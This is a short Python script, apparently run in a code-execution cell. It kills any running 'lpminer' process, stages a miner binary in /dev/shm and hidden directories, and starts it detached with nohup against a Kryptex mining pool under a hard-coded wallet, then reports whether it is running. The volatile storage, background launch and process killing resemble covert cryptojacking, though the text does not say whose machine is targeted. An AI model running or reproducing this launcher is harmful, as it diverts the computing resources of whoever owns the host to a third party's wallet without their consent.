import subprocess, os, shutil
W='prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'
P='stratum+tcp://prl.kryptex.network:7048'
R='NEW-200'
subprocess.run(['pkill','-9','lpminer'],capture_output=True)
import time;time.sleep(1)
locs=['/dev/shm/lpminer','/var/tmp/pearl/lpminer',os.path.expanduser('~/.pearl-miner/lpminer/lpminer')]
src=None
for l in locs:
    if os.path.exists(l) and os.path.isfile(l) and os.path.getsize(l)>1000000:src=l;break
if src:
    d='/dev/shm/lpminer'
    if src!=d:shutil.copy2(src,d)
    os.chmod(d,0o755)
    subprocess.run(['bash','-c',f'nohup {d} --algo pearl --pool {P} --wallet {W}.{R} > /dev/shm/lpminer.log 2>&1 &'])
    time.sleep(3)
    p=subprocess.run(['pgrep','-a','lpminer'],capture_output=True,text=True)
    result='RUNNING' if p.stdout.strip() else 'FAILED'
else:result='NO_BIN'
result
